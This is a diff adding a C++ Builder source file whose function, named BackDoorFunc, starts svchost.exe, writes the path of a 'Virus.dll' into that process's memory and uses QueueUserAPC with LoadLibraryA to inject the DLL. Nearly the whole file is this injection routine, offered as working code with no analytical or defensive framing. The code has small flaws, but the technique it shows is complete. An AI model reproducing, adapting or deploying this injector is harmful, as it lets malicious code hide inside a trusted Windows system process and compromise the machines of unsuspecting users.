@@ -1,0 +1,73 @@
+#include <vcl.h>
+#pragma hdrstop
+#include <tchar.h>
+
+
+void BackDoorFunc()
+{
+	STARTUPINFO StartInfo = {};
+	PROCESS_INFORMATION ProcInfo = {};
+	StartInfo.cb = sizeof(StartInfo);
+	int result = CreateProcess(L"C:\\Windows\\system32\\svchost.exe",
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								0,
+								&StartInfo,
+								&ProcInfo);
+	if (!result)
+	{
+		ShowMessage("CreateProcess Fail");
+		return;
+	}
+
+
+	AnsiString CurPath = ExtractFilePath(Application->ExeName);
+	char* DllPath = AnsiString(CurPath + "Virus.dll").c_str() ;
+	DWORD DllPathLen = strlen(DllPath) + 1;
+	HMODULE KernelModAddr = GetModuleHandle(L"Kernel32.dll");
+	FARPROC LoadLibraryAddr = GetProcAddress(KernelModAddr, "LoadLibraryA");
+	if ((!KernelModAddr) || (!LoadLibraryAddr))
+	{
+		ShowMessage("Get ModualBase Fail");
+		return;
+	}
+	PVOID param = VirtualAllocEx(ProcInfo.hProcess , NULL, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
+	if (!param)
+	{
+		ShowMessage("Memory Alloc Fail");
+		return;
+	}
+	WriteProcessMemory(ProcInfo.hProcess, param,(LPVOID)DllPath, DllPathLen, 0);
+	QueueUserAPC((PAPCFUNC)LoadLibraryAddr,ProcInfo.hThread ,(DWORD)param);
+	ShowMessage("Over");
+}
+
+
+int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, int)
+{
+	try
+	{
+		BackDoorFunc();
+	}
+	catch (Exception &exception)
+	{
+		Application->ShowException(&exception);
+	}
+	catch (...)
+	{
+		try
+		{
+			throw Exception("");
+		}
+		catch (Exception &exception)
+		{
+			Application->ShowException(&exception);
+		}
+	}
+	return 0;
+}
+//---------------------------------------------------------------------------
